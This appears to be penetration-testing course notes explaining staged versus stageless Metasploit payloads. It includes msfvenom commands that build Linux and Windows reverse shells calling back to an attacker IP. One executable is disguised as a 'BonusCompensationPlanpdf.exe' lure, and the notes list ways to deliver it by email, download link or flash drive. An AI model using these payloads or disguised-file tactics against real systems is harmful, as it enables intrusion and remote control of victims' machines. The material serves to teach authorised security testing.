`Staged` payloads create a way for us to send over more components of our attack. We can think of it like we are "setting the stage" for something even more useful. Take for example this payload `linux/x86/shell/reverse_tcp`. When run using an exploit module in Metasploit, this payload will send a small `stage` that will be executed on the target and then call back to the `attack box` to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell. Of course, if we use Metasploit to run this payload, we will need to configure options to point to the proper IPs and port, so the listener will successfully catch the shell. Keep in mind that a stage also takes up space in memory, which leaves less space for the payload. What happens at each stage could vary depending on the payload.

`Stageless` Payloads do not have a stage, e.g. `linux/zarch/meterpreter_reverse_tcp`. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering. This concept is also very well explained by Rapid 7 in this blog post on [stageless Meterpreter payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/).

## Building A Stageless Payload

```sh
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

```sh
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

## Executing a Stageless Payload
-   Email message with the file attached.
-   Download link on a website.
-   Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).
-   Via flash drive as part of an onsite penetration test.